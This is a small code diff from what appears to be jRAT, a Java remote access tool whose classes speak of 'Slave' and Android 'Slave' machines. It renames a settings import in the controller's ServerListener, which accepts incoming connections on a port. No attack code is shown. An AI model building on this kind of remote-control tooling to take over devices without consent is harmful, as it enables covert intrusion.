@@ -7,13 +7,13 @@ import se.jrat.client.Main;
 import se.jrat.client.Slave;
 import se.jrat.client.android.AndroidSlave;
 import se.jrat.client.exceptions.CloseException;
-import se.jrat.client.settings.Sockets;
+import se.jrat.client.settings.SettingsSockets;
 import se.jrat.common.ConnectionCodes;
 
 public class ServerListener extends PortListener implements Runnable {
 
 	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
-		super(name, port, timeout, pass, Sockets.SocketType.NORMAL_SOCKET);
+		super(name, port, timeout, pass, SettingsSockets.SocketType.NORMAL_SOCKET);
 	}
 
 	@Override
